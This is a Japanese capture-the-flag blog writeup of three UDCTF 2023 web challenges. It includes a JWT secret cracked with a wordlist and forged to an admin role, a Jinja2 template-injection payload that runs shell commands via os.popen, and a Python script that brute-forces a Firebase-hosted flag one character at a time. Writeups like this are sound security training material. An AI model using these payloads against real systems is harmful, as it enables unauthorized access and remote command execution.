---
title: "UDCTF 2023 Writeup"
date: 2023-10-31T14:00:00+09:00
lastmod: 2023-10-31T14:00:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: ""
---
{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=auto&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fudctf_2023%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

URL: [https://bluehens.ctfd.io/challenges](https://bluehens.ctfd.io/challenges)
<br /><br />

287 points を取り、250位でした。

<img src="https://captureamerica.github.io/writeups/img/udctf_2023_Score.png" alt="udctf_2023_Score.png">

<br><br>
Web チャレンジだけやりました。他はほぼ未着手なので、スクリーンショット撮っていません。

<img src="https://captureamerica.github.io/writeups/img/udctf_2023_chall.png" alt="udctf_2023_chall.png">


<br /><br />
## [Web]: Super Admin (77 points)
- - -
### Challenge
> Comfort food.
<br /><br />
https://bluehens-web-cookies.chals.io/

<br />

### Solution

チャレンジ文が `Comfort food.` しか無いですが、Webチャレンジで食べ物と言ったら Cookie ですね。

ウェブサイトに飛んで User と書かれたボタンを押すと、以下の Cookie が付きます。

<pre>
Set-Cookie: creds=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTY5ODQ5MDg2NX0.QRtAAMe3AOv2Rh4UJhXzhw4IA2h8akOh9wy9BvZdA54; Max-Age=900; Path=/; Expires=Sat, 28 Oct 2023 11:16:05 GMT
</pre>

<br />

Base64デコードしたら、JWTなのがわかります。

<pre>
$ echo -n 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9' | base64 -d
{"alg":"HS256","typ":"JWT"}
</pre>

<br />

jwt_tool.py を使って Secret Key をゲットします。

<pre>
$ python3 jwt_tool.py -C eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTY5ODQ5MDg2NX0.QRtAAMe3AOv2Rh4UJhXzhw4IA2h8akOh9wy9BvZdA54 -d /usr/share/wordlists/rockyou.txt
:
[+] password1 is the CORRECT key!
:
</pre>

<br />

https://jwt.io/ で、上記のkeyを使って、userのところをadminに書き換えます。

<br />

FireFoxのdeveloper toolsのstorageのところでcookieの値を書き換えて、profileページに飛ぶとフラグが得られます。

<br />

Flag: `UDCTF{k33p_17_51mp13_57up1d_15_4_l1e}`



<br /><br />
<br /><br />
## [Web]: Just Cat The Flask 1/2 (100 points)
- - -
### Challenge
> https://bluehens-cat-the-flask.chals.io/greeting/hackers
<br /><br />
-ProfNinja and DaveTheDaemonSlayer

（後日みたらURLが変わっているようですが、上記は自分が解いたときのものです。）

<br />

### Solution

https://bluehens-cat-the-flask.chals.io/ にアクセスすると、以下が表示されます。
<pre>
USAGE: /greeting/:name
</pre>

<br />

次に、https://bluehens-cat-the-flask.chals.io/greeting/{{4*4}} にアクセスすると、以下が表示されます。
<pre>
Hi 16!
</pre>

<br />

Jinja2 SSTI ってやつかな。

参考：[https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)


<br />
`{{4*4}}` の部分を `{{config.__class__.__init__.__globals__['os'].popen('ls -al').read()}}` のように変えると、ファイルの一覧が取れます。

<pre>
Welcome total 24 
drwxr-xr-x 1 root root 4096 Oct 28 08:08 . 
drwxr-xr-x 1 root root 4096 Oct 28 07:58 .. 
-rwxr-xr-x 1 root root 658 Oct 28 06:16 chall.py 
-rw-r--r-- 1 root root 46 Oct 28 05:49 flag1.txt 
-rw-r--r-- 1 root root 13 Oct 28 05:51 requirements.txt 
drwxr-xr-x 2 root root 4096 Oct 28 05:51 sum_suckers_creds !
</pre>

<br />

あとは、flag1.txt の中身を見るだけです。

<br />

Flag: `UDCTF{l4y3r_1_c0mpl3t3_g00d_luck_w1th_p4rt_2}`




<br /><br />
<br /><br />
## [Web]: Best Bathroom on Campus (100 points)
- - -
### Challenge
> <img src="https://captureamerica.github.io/writeups/img/udctf_2023_bestbathroom.png" alt="udctf_2023_bestbathroom.png">
> <br /><br />
> https://best-bathroom-default-rtdb.firebaseio.com/flag/UDCTF.json
> <br /><br />
> (Tried 'em all)

<br />

### Solution

チャレンジ文にあるスクリーンショットを見たら、brute forceしたらいいのはわかります。

<br />

ちょっと動作確認をすると、以下のような感じで、`true`か`null`が返るようです。

<pre>
https://best-bathroom-default-rtdb.firebaseio.com/flag/UDCTF{.json
==> trueが返る

https://best-bathroom-default-rtdb.firebaseio.com/flag/UDCTF{A.json
==> nullが返る

https://best-bathroom-default-rtdb.firebaseio.com/flag/UDCTFA.json
==> nullが返る
</pre>

<br />

自分のブログを見返して（実際にはローカルでgrepサーチ）、
[BCACTF CTF 2022](https://captureamerica.github.io/writeups/post/bcactf_2022/#web-blatant-sqli-175-points) で書いたコードが使え回せそうだったので、それを編集して使いました。

```python
#!/usr/bin/env python

import requests, string

chars = list(string.printable)
# chars = list(string.ascii_lowercase + string.digits + '!#$&?@{}_')

flag = 'UDCTF{'
url = 'https://best-bathroom-default-rtdb.firebaseio.com/flag/'

while True:
    for c in chars:
        if c == '%' or c == ',' or c == ';' or c == '/':
            continue
        temp_flag = flag + c
        temp_url = url + temp_flag + ".json"
        print(temp_url)
        response  = requests.get(temp_url)
        # if 'true' in response.text:
        if response.text == 'true':
            flag = temp_flag
            print(flag)
            if c == '}':
                exit()
            break;
        else:
            pass
```


<br />
なお、テストの結果、`/`が含まれていると true が返って来てしまうようなので新たに除外リストに入れました。


<br />

Flag: `UDCTF{1ce_L4br4t0ry_s3C0nd_Fl0or_b0y's_b4thr00m}`


<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />

